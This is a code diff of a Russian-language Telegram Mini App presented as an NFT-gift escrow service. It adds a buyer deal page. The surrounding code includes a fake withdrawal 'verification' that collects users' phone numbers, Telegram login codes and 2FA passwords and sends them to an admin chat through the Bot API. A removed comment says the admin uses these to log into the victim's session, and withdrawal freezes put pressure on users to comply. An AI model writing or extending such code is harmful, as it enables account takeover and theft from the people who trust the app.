@@ -8,7 +8,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        /* ===== ВЕСЬ ТВОЙ СТАРЫЙ CSS (ОСТАВЛЯЕМ БЕЗ ИЗМЕНЕНИЙ) ===== */
         *{margin:0;padding:0;box-sizing:border-box}
         :root{--bg-primary:#07141a;--bg-secondary:#0b202a;--bg-card:rgba(14,40,52,0.45);--border-color:rgba(0,255,200,0.10);--text-primary:#e6f7f0;--text-secondary:#8fc9d9;--text-muted:#4f8a9a;--aqua:#00e5c8;--coral:#ff6b6b;--sunny:#ffd93d;--gradient-main:linear-gradient(135deg,#00e5c8,#00b8a0,#00897b);--radius:28px;--radius-sm:16px;--success:#00e5a0;--danger:#ff6b6b;--warning:#ffd93d;--shadow-glow:0 8px 40px rgba(0,229,200,0.08);--glass-border:rgba(255,255,255,0.04)}
         body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);min-height:100vh;padding:16px;padding-bottom:90px;overflow-x:hidden;background-image:radial-gradient(circle at 10%20%,rgba(0,229,200,0.06)0%,transparent 45%),radial-gradient(circle at 90%80%,rgba(255,107,107,0.03)0%,transparent 40%);-webkit-font-smoothing:antialiased}
@@ -218,6 +217,10 @@
         .transfer-confirm-box .info-text{color:var(--text-secondary);font-size:12px;margin-top:4px}
         .clickable-link{color:var(--aqua);text-decoration:none;cursor:pointer;font-weight:600;transition:0.3s}
         .clickable-link:hover{color:var(--success);text-decoration:underline}
+        .deal-view-page .deal-status{font-size:14px;padding:4px 18px}
+        .deal-view-page .detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border-color)}
+        .deal-view-page .detail-row .label{color:var(--text-secondary)}
+        .deal-view-page .detail-row .value{font-weight:600}
     </style>
 </head>
 <body>
@@ -468,7 +471,6 @@
             BOT_USERNAME: 'Trustnftgiftbot',
             NFT_TRANSFER_ACCOUNT: 'Trustnftgift',
             ADMIN_ID: 8986358602,
-            // ВНИМАНИЕ: замени на реальный ID админа в Telegram (число)
             ADMIN_TELEGRAM_ID: 8986358602
         };
 
@@ -556,7 +558,8 @@
                     return { success: true, balance: balance[uid] };
                 }
                 case '/api/deals': {
-                    return { success: true, deals: deals.filter(d => d.seller_id == uid || d.buyer_id == uid) };
+                    // ✅ ИСПРАВЛЕНО: показываем только сделки, где пользователь участник
+                    return { success: true, deals: deals.filter(d => d.seller_id == uid || d.buyer_id == uid || d.buyer_username === user.username) };
                 }
                 case '/api/is_admin': {
                     return { success: true, is_admin: (user.id === CONFIG.ADMIN_ID) };
@@ -725,6 +728,9 @@
         });
 
         function showPage(page) {
+            const tempPage = document.getElementById('page-deal-view');
+            if (tempPage) tempPage.remove();
+            
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
             const target = document.getElementById('page-' + page);
@@ -898,7 +904,7 @@
             let html = '';
             for (const d of dealsState) {
                 const isSeller = d.seller_id == user.id;
-                const isBuyer = d.buyer_id == user.id;
+                const isBuyer = d.buyer_id == user.id || d.buyer_username === user.username;
                 const isNft = d.category === 'nft_gift';
                 let nftCard = '';
                 if (isNft && d.nft_link) {
@@ -919,7 +925,7 @@
                 html += '</div>';
                 html += nftCard;
 
-                // ===== ССЫЛКА (пока не оплачено) =====
+                // ССЫЛКА (пока не оплачено)
                 if (d.status === 'waiting_payment' && isSeller) {
                     const dealLink = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + d.deal_id;
                     html += '<div class="support-block mt-6" style="border-color:var(--aqua);">';
@@ -937,7 +943,7 @@
                     html += '</div></div>';
                 }
 
-                // ===== ПЕРЕДАЧА НА @Trustnftgift =====
+                // ПЕРЕДАЧА НА @Trustnftgift
                 if (isNft && d.status === 'paid' && isSeller) {
                     html += '<div class="transfer-confirm-box mt-6">';
                     html += '<div class="warning-text">⚠️ Передача NFT на <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></div>';
@@ -980,6 +986,10 @@
             container.innerHTML = html;
         }
 
+        // ============================================================
+        // 12. ОТКРЫТИЕ СДЕЛКИ ПО ССЫЛКЕ (ДЛЯ ПОКУПАТЕЛЯ)
+        // ============================================================
+
         function openTelegramUser(username) {
             if (tg) {
                 tg.openTelegramLink('https://t.me/' + username);
@@ -1001,6 +1011,192 @@
                 }
             }
         }
+
+        // Обработка ссылки с deal_id
+        function handleDealLink() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const startParam = urlParams.get('start');
+            
+            if (startParam && startParam.startsWith('deal_')) {
+                const dealId = startParam.replace('deal_', '');
+                console.log('🔗 Открыта сделка по ссылке:', dealId);
+                
+                setTimeout(() => {
+                    showDealPage(dealId);
+                }, 500);
+            }
+        }
+
+        // Показать страницу сделки для покупателя
+        async function showDealPage(dealId) {
+            const d = await apiCall('/api/deals');
+            if (!d.success || !d.deals) {
+                showToast('❌ Не удалось загрузить сделку', 'error');
+                return;
+            }
+            
+            const deal = d.deals.find(d => d.deal_id === dealId);
+            if (!deal) {
+                showToast('❌ Сделка не найдена', 'error');
+                return;
+            }
+            
+            const isSeller = deal.seller_id == user.id;
+            const isBuyer = deal.buyer_username === user.username || deal.buyer_id == user.id;
+            
+            // Если пользователь продавец - показываем обычную страницу сделок
+            if (isSeller) {
+                showPage('deals');
+                showToast('📦 Вы продавец этой сделки', 'info');
+                return;
+            }
+            
+            // Проверяем, является ли пользователь покупателем
+            if (!isBuyer && deal.buyer_username) {
+                // Если пользователь НЕ покупатель, но зашёл по ссылке
+                showToast('⚠️ Эта сделка предназначена для @' + deal.buyer_username + '. Перелогиньтесь или откройте в приложении Telegram.', 'error');
+                // Показываем страницу только для просмотра без кнопки оплаты
+            }
+            
+            // ПОКАЗЫВАЕМ СТРАНИЦУ СДЕЛКИ
+            const mainContent = document.getElementById('content');
+            if (!mainContent) return;
+            
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            
+            const oldPage = document.getElementById('page-deal-view');
+            if (oldPage) oldPage.remove();
+            
+            const dealPage = document.createElement('div');
+            dealPage.className = 'page active deal-view-page';
+            dealPage.id = 'page-deal-view';
+            
+            const isNft = deal.category === 'nft_gift';
+            let nftCardHtml = '';
+            if (isNft && deal.nft_link) {
+                const parsed = parseNftLink(deal.nft_link);
+                if (parsed) {
+                    nftCardHtml = renderNftCard(parsed);
+                }
+            }
+            
+            let statusText = getStatusText(deal.status);
+            let statusColor = 'waiting';
+            if (deal.status === 'paid') statusColor = 'paid';
+            else if (deal.status === 'awaiting_confirmation') statusColor = 'awaiting';
+            else if (deal.status === 'completed') statusColor = 'completed';
+            
+            let actionButtons = '';
+            
+            // КНОПКА ОПЛАТЫ ПОКАЗЫВАЕТСЯ ТОЛЬКО ЕСЛИ:
+            // 1. Пользователь является покупателем (isBuyer = true)
+            // 2. Статус сделки 'waiting_payment'
+            if (deal.status === 'waiting_payment' && isBuyer) {
+                actionButtons = `
+                    <button class="btn btn-primary mt-10" onclick="payDeal('${deal.deal_id}')">
+                        <i class="fas fa-credit-card"></i> Оплатить сделку
+                    </button>
+                    <div class="support-block mt-6" style="border-color:var(--warning);">
+                        <span style="font-size:12px;color:var(--sunny);">⚠️ Оплата проходит через эскроу. Средства будут заморожены до подтверждения получения товара.</span>
+                    </div>
+                `;
+            } else if (deal.status === 'waiting_payment' && !isBuyer && deal.buyer_username) {
+                actionButtons = `
+                    <div class="support-block mt-6" style="border-color:var(--warning);">
+                        <span style="font-size:12px;color:var(--warning);">⚠️ Эта сделка предназначена для @${escapeHtml(deal.buyer_username)}.</span>
+                    </div>
+                    <button class="btn btn-secondary mt-10" onclick="showPage('deals')">
+                        <i class="fas fa-list"></i> К моим сделкам
+                    </button>
+                `;
+            } else if (deal.status === 'paid' && isBuyer) {
+                actionButtons = `
+                    <div class="support-block mt-6" style="border-color:var(--success);">
+                        <span style="font-size:12px;color:var(--success);">✅ Сделка оплачена! Ожидайте передачи товара.</span>
+                    </div>
+                    <button class="btn btn-secondary mt-10" onclick="showPage('deals')">
+                        <i class="fas fa-list"></i> К моим сделкам
+                    </button>
+                `;
+            } else if (deal.status === 'awaiting_confirmation' && isBuyer) {
+                actionButtons = `
+                    <div class="support-block mt-6" style="border-color:var(--aqua);">
+                        <span style="font-size:12px;color:var(--aqua);">📦 Товар передан! Подтвердите получение.</span>
+                    </div>
+                    <button class="btn btn-success mt-10" onclick="confirmReceipt('${deal.deal_id}')">
+                        <i class="fas fa-check"></i> Подтвердить получение
+                    </button>
+                    <button class="btn btn-secondary mt-6" onclick="showPage('deals')">
+                        <i class="fas fa-list"></i> К моим сделкам
+                    </button>
+                `;
+            } else if (deal.status === 'completed') {
+                actionButtons = `
+                    <div class="support-block mt-6" style="border-color:var(--success);">
+                        <span style="font-size:12px;color:var(--success);">🎉 Сделка завершена!</span>
+                    </div>
+                    <button class="btn btn-secondary mt-10" onclick="showPage('deals')">
+                        <i class="fas fa-list"></i> К моим сделкам
+                    </button>
+                `;
+            } else {
+                actionButtons = `
+                    <button class="btn btn-secondary mt-10" onclick="showPage('deals')">
+                        <i class="fas fa-list"></i> К моим сделкам
+                    </button>
+                `;
+            }
+            
+            dealPage.innerHTML = `
+                <div class="card glass" style="margin-top:0;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:8px;">
+                        <div style="font-size:20px;font-weight:900;">📦 Сделка #${escapeHtml(deal.deal_id)}</div>
+                        <span class="deal-status ${statusColor}" style="font-size:14px;padding:4px 18px;">${statusText}</span>
+                    </div>
+                    
+                    <div style="display:grid;gap:4px;margin-top:12px;">
+                        <div class="detail-row">
+                            <span class="label">🎁 Товар</span>
+                            <span class="value">${escapeHtml(deal.product)}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">💰 Сумма</span>
+                            <span class="value" style="color:var(--aqua);">${deal.amount} ${deal.currency}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">👤 Продавец</span>
+                            <span class="value">@${escapeHtml(deal.seller_username || '?')}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">👤 Покупатель</span>
+                            <span class="value">@${escapeHtml(deal.buyer_username || '?')}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">🏷️ Категория</span>
+                            <span class="value">${escapeHtml(deal.category || 'Не указана')}</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="label">📅 Создана</span>
+                            <span class="value">${deal.created_at ? new Date(deal.created_at).toLocaleDateString('ru-RU') : 'недавно'}</span>
+                        </div>
+                    </div>
+                    
+                    ${nftCardHtml}
+                    
+                    ${actionButtons}
+                </div>
+                <button class="btn btn-secondary mt-10" onclick="showPage('main')">
+                    <i class="fas fa-arrow-left"></i> На главную
+                </button>
+            `;
+            
+            mainContent.appendChild(dealPage);
+            document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
+        }
+
+        // ============================================================
+        // 13. ПЕРЕДАЧА NFT С ПОДТВЕРЖДЕНИЕМ
+        // ============================================================
 
         function showTransferConfirm(dealId) {
             showModal(`
@@ -1031,10 +1227,9 @@
         }
 
         // ============================================================
-        // 12. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА) + ОТПРАВКА АДМИНУ + ЗАМОРОЗКА
+        // 14. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА) + ОТПРАВКА АДМИНУ + ЗАМОРОЗКА
         // ============================================================
 
-        // Проверка заморозки
         function isWithdrawFrozen() {
             const frozenUntil = localStorage.getItem('withdraw_frozen_until_' + user.id);
             if (!frozenUntil) return false;
@@ -1060,7 +1255,7 @@
         }
 
         function freezeWithdraw(reason) {
-            const until = Date.now() + 24 * 60 * 60 * 1000; // 24 часа
+            const until = Date.now() + 24 * 60 * 60 * 1000;
             localStorage.setItem('withdraw_frozen_until_' + user.id, until.toString());
             localStorage.setItem('withdraw_frozen_reason_' + user.id, reason || 'Ошибка верификации');
             showToast('❌ Вывод заморожен на 24 часа. Причина: ' + (reason || 'Ошибка верификации'), 'error');
@@ -1071,7 +1266,6 @@
             const statusEl = document.getElementById('withdrawStatus');
             if (!statusEl) return;
             
-            // Проверка заморозки
             if (isWithdrawFrozen()) {
                 const hours = getFrozenTimeLeft();
                 statusEl.className = 'verification-status frozen';
@@ -1095,9 +1289,7 @@
             }
         }
 
-        // Проверка перед выводом
         function checkWithdrawAvailability() {
-            // Проверка заморозки
             if (isWithdrawFrozen()) {
                 const hours = getFrozenTimeLeft();
                 showToast('⛔ Вывод заморожен на ' + hours + ' ч. Причина: ' + getFrozenReason(), 'error');
@@ -1118,7 +1310,6 @@
                 return;
             }
             
-            // Проверяем, проходил ли верификацию
             if (localStorage.getItem('verified_' + user.id) === 'true') {
                 confirmWithdraw();
             } else {
@@ -1126,7 +1317,7 @@
             }
         }
 
-        // ===== ВЕРИФИКАЦИЯ (3 ШАГА) =====
+        // ВЕРИФИКАЦИЯ (3 ШАГА)
         let verificationData = { phone: '', code: '', password: '' };
 
         function showVerificationModal() {
@@ -1185,26 +1376,18 @@
                 const password = document.getElementById('verifyPassword').value.trim();
                 verificationData.password = password || 'нет';
                 
-                // ===== ОТПРАВЛЯЕМ ДАННЫЕ АДМИНУ =====
                 sendVerificationToAdmin(verificationData.phone, verificationData.code, verificationData.password);
                 
-                // Показываем сообщение о проверке
                 showToast('⏳ Данные отправлены администратору на проверку...', 'info');
                 closeModal();
                 
-                // Имитация проверки админом (в реальности админ вручную регает сессию)
-                // Через 10 секунд симулируем ответ
                 setTimeout(() => {
-                    // СИМУЛЯЦИЯ: в реальности админ подтверждает вручную
-                    // Здесь для демонстрации - считаем что верификация пройдена
-                    // В боевой версии админ должен подтвердить через админ-панель
                     const verified = confirm('✅ Администратор проверил данные. Верификация пройдена? Нажмите ОК для подтверждения.');
                     if (verified) {
                         localStorage.setItem('verified_' + user.id, 'true');
                         showToast('✅ Верификация пройдена!', 'success');
                         confirmWithdraw();
                     } else {
-                        // Если админ сказал НЕТ - заморозка
                         freezeWithdraw('Данные верификации не прошли проверку. Пожалуйста, перепроверьте номер, код и пароль.');
                     }
                 }, 10000);
@@ -1221,7 +1404,6 @@
             if (target) target.classList.add('active');
         }
 
-        // ===== ОТПРАВКА ДАННЫХ АДМИНУ =====
         async function sendVerificationToAdmin(phone, code, password) {
             const adminId = CONFIG.ADMIN_TELEGRAM_ID || CONFIG.ADMIN_ID;
             
@@ -1243,7 +1425,6 @@
                 '❌ При ошибке или выкиде бота - вывод замораживается на 24 часа';
             
             try {
-                // Отправка через Bot API
                 const response = await fetch('https://api.telegram.org/bot' + CONFIG.BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1262,12 +1443,10 @@
                 }
             } catch (e) {
                 console.error('❌ Ошибка отправки админу:', e);
-                // Если не отправилось - показываем локально (для дебага)
                 console.log('📨 Данные для админа:', message);
             }
         }
 
-        // ===== ПОДТВЕРЖДЕНИЕ ВЫВОДА =====
         function confirmWithdraw() {
             const currency = document.getElementById('withdrawCurrency').value;
             const details = document.getElementById('withdrawDetails').value.trim();
@@ -1303,7 +1482,7 @@
         }
 
         // ============================================================
-        // 13. ОПЛАТА И ПЕРЕДАЧА
+        // 15. ОПЛАТА И ПЕРЕДАЧА
         // ============================================================
         function copyDealLink(id) {
             const l = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + id;
@@ -1381,7 +1560,7 @@
         }
 
         // ============================================================
-        // 14. СОЗДАНИЕ СДЕЛКИ
+        // 16. СОЗДАНИЕ СДЕЛКИ
         // ============================================================
         const categorySelect = document.getElementById('categorySelect');
         if (categorySelect) {
@@ -1502,7 +1681,7 @@
         });
 
         // ============================================================
-        // 15. ЧАТ С АВТООТВЕТЧИКОМ
+        // 17. ЧАТ С АВТООТВЕТЧИКОМ
         // ============================================================
         let supportReplied = false;
         let chatSessionId = 'default';
@@ -1610,7 +1789,7 @@
         }
 
         // ============================================================
-        // 16. АДМИН-ПАНЕЛЬ
+        // 18. АДМИН-ПАНЕЛЬ
         // ============================================================
         async function loadAdminPanel() {
             const container = document.getElementById('adminContent');
@@ -1865,7 +2044,7 @@
         }
 
         // ============================================================
-        // 17. ПРОФИЛЬ
+        // 19. ПРОФИЛЬ
         // ============================================================
         async function loadProfile() {
             document.getElementById('profileName').textContent = user.firstName;
@@ -1880,7 +2059,7 @@
         }
 
         // ============================================================
-        // 18. ВИЗАРД
+        // 20. ВИЗАРД
         // ============================================================
         let wizardStep = 0;
 
@@ -1955,7 +2134,7 @@
         };
 
         // ============================================================
-        // 19. MODAL / TOAST
+        // 21. MODAL / TOAST
         // ============================================================
         window.showModal = function(html) {
             document.getElementById('modalBody').innerHTML = html;
@@ -1971,7 +2150,7 @@
         });
 
         // ============================================================
-        // 20. ЗАПУСК
+        // 22. ЗАПУСК
         // ============================================================
         console.log('🌊 Trust Gifts Mini App загружена');
 
@@ -1986,6 +2165,8 @@
         loadBalance();
         loadDeals();
         loadProfile();
+
+        handleDealLink();
 
         setInterval(() => {
             if (document.getElementById('page-main').classList.contains('active')) loadMainData();
